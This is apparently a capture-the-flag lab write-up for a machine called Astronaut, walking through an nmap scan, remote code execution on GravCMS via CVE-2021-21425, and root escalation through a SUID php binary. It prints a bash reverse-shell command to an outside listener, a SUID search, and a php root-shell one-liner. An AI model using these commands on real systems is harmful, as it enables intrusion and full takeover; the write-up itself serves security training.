#box #RCE #GTFOBins #SUID #GravCMS

Astronaut is a machine involving a CMS called Grav. The whole machine revolves around GravCMS vulnerabilities. The scan hosts only SSH and a HTTP port, the HTTP port hosts an instance of GravCMS which can be exploited through CVE-2021-21425. Once inside it's possible to escalate within another vulnerability coming from Grav with an authenticated user that permits privilege escalation.

## Nmap

The Nmap scan reports only SSH and one HTTP open port:
```bash
# Nmap 7.95 scan initiated Sun May 18 14:28:30 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCsV 192.168.183.12
Nmap scan report for 192.168.183.12
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 18 14:28:39 2025 -- 1 IP address (1 host up) scanned in 8.07 seconds
```

## HTTP and Reverse Shell

Once opened `http://192.168.183.12` we opt to reach `/grav-admin` to understand that GravCMS is served on that port.
By looking online we discover the presence of difference CVEs. Without properly knowing the version of Grav, we opt to try some as Unauthenticated, we find only [CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425) available. Given that GravCMS relies on some YAML files to run, this vulnerability permits us write/update one of those YAMLs to gain a foothold. In this particular case we'll overwrite the yaml `scheduler.yaml` to execute a sh file that we'll gonna write on the target.
By running the exploit with
```bash
python3 exploit.py -t http://192.168.231.12/grav-admin -c '/bin/bash -i >& /dev/tcp/192.168.45.249/1337 0>&1'
```
we'll have to wait a couple of minutes for the cron scheduling; the first minute will create the file, the second minute will execute it, giving us a shell.

## Privilege Escalation

Once on the machine, we investigate a few options but couldn't succeed in anything in particular since the system seems locked out. We opt for finding executables on which we have permission throughout the SUID

```bash
find / -perm /4000 2>/dev/null
```

And identify `php7.4` to be a valuable target.

We then search for a Living Off the Land for php and identify the following https://gtfobins.github.io/gtfobins/php/#suid.
We then run 
```bash
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```
and get a shell as root.
